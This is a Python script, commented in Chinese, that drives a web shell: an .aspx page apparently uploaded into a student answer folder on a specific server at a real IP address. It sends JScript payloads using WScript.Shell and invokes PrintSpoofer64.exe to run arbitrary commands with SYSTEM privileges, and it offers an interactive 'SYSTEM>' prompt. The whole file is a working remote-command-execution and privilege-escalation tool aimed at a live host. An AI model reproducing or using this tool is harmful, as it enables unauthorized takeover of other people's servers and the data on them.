import requests
import sys

# ================= 配置区域 =================
SHELL_URL = "http://120.55.241.236:999/Answer/08118106%20%E8%AE%B8%E6%B7%91%E5%AF%B0/A01/s_3711.aspx"
PASSWORD = "c"
PS_PATH = r"e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\Answer\08118106 许淑寰\A01\PrintSpoofer64.exe"

def execute_system_cmd(cmd):
    # PrintSpoofer 用法: -i -c "cmd"
    # 之前报错 "应为“,”或“)”" 是因为 JScript 解析错误，双引号转义层级不够
    # 我们的 Payload 是嵌套在 JScript 的 d.Exec("...") 里的
    # 构造: PrintSpoofer.exe -i -c "cmd /c dir \"C:\Users\""

    # 1. 对内部 cmd 的参数中的双引号进行转义 (CMD 层)
    # dir "C:\Users" -> dir \"C:\Users\"
    safe_internal_cmd = cmd.replace('"', '\\"')

    # 2. 对 PrintSpoofer 的参数进行引号包裹 (PrintSpoofer 层)
    # -c "cmd /c dir \"C:\Users\""
    # 这里不需要转义内部的双引号，因为它们是给 cmd 的
    ps_args = f'-i -c "cmd /c {safe_internal_cmd}"'

    # 3. 对整个命令字符串进行 JScript 字符串转义 (JScript 层)
    # 目标 JScript: d.Exec("PrintSpoofer.exe -i -c \"cmd /c ...\"")
    # 所有的反斜杠需要变成 \\ (JScript转义)
    # 所有的双引号需要变成 \" (JScript转义)

    ps_exe_escaped = PS_PATH.replace("\\", "\\\\")

    # 这里的转义非常关键:
    # 原始字符串: -i -c "cmd /c ..."
    # 放入 JScript 字符串后应该是: -i -c \"cmd /c ...\"
    # 所以我们要把 ps_args 里的 " 替换为 \"
    safe_ps_args = ps_args.replace("\\", "\\\\").replace('"', '\\"')

    full_cmd = f'{ps_exe_escaped} {safe_ps_args}'
    # 注意: 如果 exe 路径带空格，exe 路径本身也需要引号，并且要转义
    full_cmd = f'\\"{ps_exe_escaped}\\" {safe_ps_args}'

    payload = f"""var d=new ActiveXObject("WScript.Shell");var o=d.Exec("{full_cmd}");Response.Write(o.StdOut.ReadAll());Response.Write(o.StdErr.ReadAll());"""

    try:
        resp = requests.get(SHELL_URL, params={PASSWORD: payload}, timeout=30)
        # 过滤掉 PrintSpoofer 的 banner 信息，只显示命令结果
        output = resp.text
        if "[+] Named pipe listening..." in output:
            # 尝试截取 "CreateProcessAsUser() OK\n" 之后的内容
            parts = output.split("CreateProcessAsUser() OK")
            if len(parts) > 1:
                return parts[1].strip()
        return output.strip()
    except Exception as e:
        return f"[!] Error: {e}"

def main():
    print("=== SYSTEM 权限命令执行工具 ===")
    if len(sys.argv) < 2:
        print("[*] 用法: python system_cmd.py <command>")
        print("    示例: python system_cmd.py whoami")
        print("    示例: python system_cmd.py \"dir c:\\users\"")

        print("\n[*] 进入交互模式 (输入 exit 退出)...")
        while True:
            cmd = input("SYSTEM> ")
            if cmd.lower() == "exit": break
            if not cmd: continue
            print(execute_system_cmd(cmd))
    else:
        cmd = " ".join(sys.argv[1:])
        print(execute_system_cmd(cmd))

if __name__ == "__main__":
    main()
